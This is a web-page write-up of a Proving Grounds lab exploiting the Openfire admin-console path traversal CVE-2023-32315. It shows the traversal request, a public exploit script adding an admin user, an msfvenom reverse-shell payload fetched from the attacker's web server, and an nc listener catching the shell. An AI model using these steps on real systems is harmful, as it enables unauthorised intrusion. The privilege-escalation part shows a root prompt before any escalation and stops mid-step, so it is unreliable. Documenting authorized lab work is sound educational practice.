@@ -1,0 +1,148 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="This lab focuses on exploiting CVE-2023-32315, a Path Traversal vulnerability in Openfire&#39;s Admin Console. By abusing an unauthenticated setup environment, attackers can bypass authentication, create an admin user, upload a malicious plugin, and achieve Remote Code Execution (RCE). Privilege escalation is achieved by extracting SMTP credentials and gaining root access."><title>Proving Grounds: Fired</title><style>
+  :root { --muted:#9aa4b2; --accent:#facc15; --text:#e6eef6; --mono:ui-monospace,SFMono-Regular,Menlo,Monaco,"Roboto Mono","Courier New",monospace; --maxw:900px; }
+  * { box-sizing:border-box; } html { scroll-behavior:smooth; }
+  body { margin:0; background:linear-gradient(180deg,#071021 0%,#0f1724 50%); color:var(--text); font-family:Inter,"Segoe UI",Roboto,system-ui,-apple-system,sans-serif; -webkit-font-smoothing:antialiased; line-height:1.6; }
+  .wrap { max-width:var(--maxw); margin:40px auto; padding:28px; background:linear-gradient(180deg,rgba(255,255,255,.02),rgba(255,255,255,.01)); border:1px solid rgba(255,255,255,.03); border-radius:12px; box-shadow:0 6px 30px rgba(2,6,23,.6); }
+  .site-header { display:flex; align-items:center; justify-content:space-between; gap:16px; padding-bottom:18px; margin-bottom:24px; border-bottom:1px solid rgba(255,255,255,.06); }
+  .site-brand { color:var(--accent); font-weight:750; letter-spacing:.02em; text-decoration:none; } .site-brand:hover,.site-link:hover { color:#ffe57a; } .site-link { color:var(--muted); font-size:13px; text-decoration:none; } .back-button { padding:7px 11px; border:1px solid rgba(250,204,21,.24); border-radius:7px; background:rgba(250,204,21,.08); color:var(--accent); font-weight:650; }
+  .target-tag { display:inline-block; margin-bottom:12px; padding:5px 10px; border:1px solid rgba(250,204,21,.24); border-radius:999px; color:var(--accent); background:rgba(250,204,21,.1); font-size:12px; font-weight:700; letter-spacing:.08em; text-transform:uppercase; }
+  header h1 { margin:0; font-size:28px; letter-spacing:-.2px; line-height:1.25; } header p { margin:8px 0 0; color:var(--muted); font-size:14px; }
+  .meta { display:flex; flex-wrap:wrap; gap:12px; align-items:center; margin-top:18px; color:var(--muted); font-size:13px; } .badge { background:rgba(250,204,21,.12); color:var(--accent); padding:6px 10px; border-radius:999px; font-weight:600; font-size:13px; }
+  nav.toc { margin-top:22px; padding:14px; background:rgba(255,255,255,.02); border:1px solid rgba(255,255,255,.02); border-radius:8px; } nav.toc ul { display:flex; flex-wrap:wrap; gap:10px; margin:0; padding:0; list-style:none; } nav.toc a { color:var(--muted); text-decoration:none; font-size:13px; } nav.toc a:hover { color:var(--accent); }
+  article { margin-top:28px; } h2 { margin-top:30px; color:var(--accent); font-size:22px; scroll-margin-top:20px; } h3 { margin-top:22px; color:#dfe9f6; font-size:17px; } h4,h5,h6 { color:#dfe9f6; } p,li { overflow-wrap:anywhere; } a { color:var(--accent); } strong { color:#f4f8fc; }
+  blockquote { margin:16px 0; padding:10px 12px; color:var(--muted); background:rgba(250,204,21,.06); border-left:3px solid rgba(250,204,21,.22); border-radius:4px; }
+  .code-brief { margin:18px 0 8px; color:var(--muted); font-size:14px; }
+  pre { margin:12px 0; padding:14px; overflow:auto; color:#dff3ff; background:#041022; border:1px solid rgba(255,255,255,.03); border-radius:8px; box-shadow:0 6px 18px rgba(2,6,23,.5); font:13px/1.55 var(--mono); } code { padding:2px 6px; border-radius:4px; background:rgba(255,255,255,.04); font-family:var(--mono); font-size:.9em; } pre code { padding:0; background:transparent; font-size:inherit; }
+  table { width:100%; margin-top:12px; border-collapse:collapse; } th,td { padding:8px; border-bottom:1px solid rgba(255,255,255,.06); text-align:left; color:var(--muted); font-size:14px; } th { color:#dfe9f6; font-weight:600; } hr { border:0; border-top:1px solid rgba(255,255,255,.08); margin:28px 0; } img { max-width:100%; border-radius:8px; }
+  footer { margin-top:30px; padding-top:12px; border-top:1px solid rgba(255,255,255,.02); color:var(--muted); font-size:13px; text-align:center; }
+  @media (max-width:720px) { .wrap { margin:18px; padding:16px; } header h1 { font-size:20px; } nav.toc ul { flex-direction:column; gap:6px; } }
+</style></head><body><main class="wrap"><div class="site-header"><a class="site-brand" href="index.html">Karan Tank</a><a class="site-link back-button" href="index.html">← Back to index</a></div><header><span class="target-tag">Target: Linux</span><h1>Proving Grounds: Fired</h1><p>This lab focuses on exploiting CVE-2023-32315, a Path Traversal vulnerability in Openfire&#39;s Admin Console. By abusing an unauthenticated setup environment, attackers can bypass authentication, create an admin user, upload a malicious plugin, and achieve Remote Code Execution (RCE). Privilege escalation is achieved by extracting SMTP credentials and gaining root access.</p><div class="meta"><span class="badge">Proving Grounds</span><span>Authorized lab writeup</span><span>Cybersecurity portfolio</span></div></header><nav class="toc" aria-label="Table of contents"><ul><li><a href="#scenario">Scenario</a></li><li><a href="#learning-objectives">Learning objectives</a></li><li><a href="#initial-access">Initial Access</a></li><li><a href="#privilege-escalation">Privilege Escalation</a></li><li><a href="#takeaways">Takeaways</a></li></ul></nav><article><blockquote>
+<p><strong>Authorized-lab note:</strong> This writeup documents activity performed exclusively in an authorized Offensive Security Proving Grounds lab. It is shared for educational and portfolio purposes.</p>
+</blockquote>
+<p>In this lab, you will leverage enumeration techniques to identify potential vulnerabilities. The lab involves exploiting CVE-2023-32315 and practicing privilege escalation to gain unauthorized access. This lab focuses on understanding and exploiting vulnerabilities to enhance security awareness.</p>
+<h2 id="scenario">Scenario</h2>
+<p>This lab focuses on exploiting CVE-2023-32315, a Path Traversal vulnerability in Openfire&#39;s Admin Console. By abusing an unauthenticated setup environment, attackers can bypass authentication, create an admin user, upload a malicious plugin, and achieve Remote Code Execution (RCE). Privilege escalation is achieved by extracting SMTP credentials and gaining root access.</p>
+<h2 id="learning-objectives">Learning objectives</h2>
+<p><strong>After completion of this lab, learners will be able to:</strong></p>
+<ul>
+<li>Perform enumeration to identify Openfire&#39;s Admin Console running on port 9090.</li>
+<li>Exploit CVE-2023-32315 using an automated script to create a new admin user.</li>
+<li>Leverage the new admin access to upload a malicious plugin and achieve RCE as the openfire user.</li>
+<li>Enumerate the embedded database to extract cleartext SMTP credentials.</li>
+<li>Use the recovered credentials to escalate to root privileges and retrieve the final proof.</li>
+</ul>
+<h2 id="initial-access">Initial Access</h2>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code># The scan output identifies the target&#39;s exposed services and their versions.
+
+PORT     STATE SERVICE                VERSION
+22/tcp   open  ssh                    OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 51:56:a7:34:16:8e:3d:47:17:c8:96:d5:e6:94:46:46 (RSA)
+|   256 fe:76:e3:4c:2b:f6:f5:21:a2:4d:9f:59:52:39:b9:16 (ECDSA)
+|_  256 2c:dd:62:7d:d6:1c:f4:fd:a1:e4:c8:aa:11:ae:d6:1f (ED25519)
+9090/tcp open  hadoop-tasktracker     Apache Hadoop
+| hadoop-datanode-info: 
+|_  Logs: jive-ibtn jive-btn-gradient
+|_http-title: Site doesn\&#39;t have a title (text/html).
+| hadoop-tasktracker-info: 
+|_  Logs: jive-ibtn jive-btn-gradient
+9091/tcp open  ssl/hadoop-tasktracker Apache Hadoop
+| hadoop-tasktracker-info: 
+|_  Logs: jive-ibtn jive-btn-gradient
+| ssl-cert: Subject: commonName=localhost
+| Subject Alternative Name: DNS:localhost, DNS:*.localhost
+| Not valid before: 2024-06-28T07:02:39
+|_Not valid after:  2029-06-27T07:02:39
+| hadoop-datanode-info: 
+|_  Logs: jive-ibtn jive-btn-gradient
+|_http-title: Site doesn\&#39;t have a title (text/html).
+|_ssl-date: TLS randomness does not represent time
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><ul>
+<li><p>Port <code>9091</code> shows random text</p>
+</li>
+<li><p>Port <code>9090</code> loads openfire admin console</p>
+</li>
+<li><p>Found a article that highlights <a href="https://github.com/advisories/GHSA-gw42-f939-fhvm">Authentication Bypass and Path Transversal for openfire</a></p>
+</li>
+<li><p>Followed the method as per <a href="https://www.enciphers.com/exploiting-cve/path-traversal-in-openfire-admin-console-cve-2023-32315">Understanding CVE-2023-32315: Path Traversal in Openfire Admin Console</a></p>
+</li>
+</ul>
+<p><code>GET /setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=RMGGKs8QAoxf7iY&amp;username=test&amp;password=test@123&amp;passwordconfirm=test@123&amp;usadmin=on&amp;create=Create%2bUser HTTP/1.1</code></p>
+<ul>
+<li>However, this did not work</li>
+<li>Searching more, we came across a githuib <a href="https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT">CVE-2023-32315-EXPLOIT</a></li>
+</ul>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code># Run the helper or analysis script used in this lab step.
+
+└─$ python3 CVE-2023-32315.py -u http://192.168.173.96:9090
+
+ ██████ ██    ██ ███████       ██████   ██████  ██████  ██████        ██████  ██████  ██████   ██ ███████
+██      ██    ██ ██                 ██ ██  ████      ██      ██            ██      ██      ██ ███ ██     
+██      ██    ██ █████   █████  █████  ██ ██ ██  █████   █████  █████  █████   █████   █████   ██ ███████
+██       ██  ██  ██            ██      ████  ██ ██           ██            ██ ██           ██  ██      ██
+ ██████   ████   ███████       ███████  ██████  ███████ ██████        ██████  ███████ ██████   ██ ███████
+
+Coded By: K3ysTr0K3R --&gt; Hug me ʕっ•ᴥ•ʔっ
+
+[*] Launching exploit against: http://192.168.173.96:9090
+[*] Checking if the target is vulnerable
+[+] Target is vulnerable
+[*] Adding credentials
+[+] Successfully added, here are the credentials
+[+] Username: hugme
+[+] Password: HugmeNOW</code></pre><ul>
+<li><p>Using this credentials we are able to login into the openfire admin console now</p>
+</li>
+<li><p>After we are logged in, following the as per this article that mentions <a href="https://www.enciphers.com/exploiting-cve/path-traversal-in-openfire-admin-console-cve-2023-32315">uploading a malicious plugin</a></p>
+</li>
+</ul>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>─(.myenv)─(kali㉿kali)-[~/offsec/fired]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ msfvenom -p linux/x64/shell_reverse_tcp -f elf -o pshell LHOST=192.168.45.164 LPORT=1234
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of elf file: 194 bytes
+Saved as: pshell
+                                                                                                                                     
+┌──(.myenv)─(kali㉿kali)-[~/offsec/fired]
+# Run the helper or analysis script used in this lab step.
+
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.173.96 - - [19/Jun/2026 17:21:00] &quot;GET /pshell HTTP/1.1&quot; 200</code></pre><p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>(kali㉿kali)-[~/offsec/fired]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ rlwrap nc -nlvp 1234
+listening on [any] 1234 ...
+connect to [192.168.45.164] from (UNKNOWN) [192.168.173.96] 42114
+# Run the helper or analysis script used in this lab step.
+
+python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
+# Execute the next evidence-gathering step in the authorized lab.
+
+openfire@openfire:/$ id
+id
+uid=114(openfire) gid=118(openfire) groups=118(openfire)</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
+<ul>
+<li>Nothing interesting found in linpeas, no crontab, no sudo -l permissions</li>
+<li>Exploring aroung, found the openfire under <code>/var/lib</code></li>
+</ul>
+<p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code># Inspect the directory for files relevant to the next step.
+
+ls
+embedded-db  plugins
+root@openfire:/var/lib/openfire# cd emb*
+# Move into the directory needed for the next action.
+
+cd emb*
+root@openfire:/var/lib/openfire/embedded-db# ls
+# Inspect the directory for files relevant to the next step.
+
+ls
+openfire.lck  openfire.log  openfire.properties  openfire.script  openfire.tmp
+root@openfire:/var/lib/openfire/embedded-db# cat openfire.script</code></pre><h2 id="takeaways">Takeaways</h2>
+<p>This lab reinforced the value of methodical enumeration, evidence-driven hypothesis testing, and validating each access-control boundary in an authorized environment.</p>
+</article><footer>Written by Karan Tank · Documented for educational and portfolio purposes in an authorized lab environment.</footer></main></body></html>
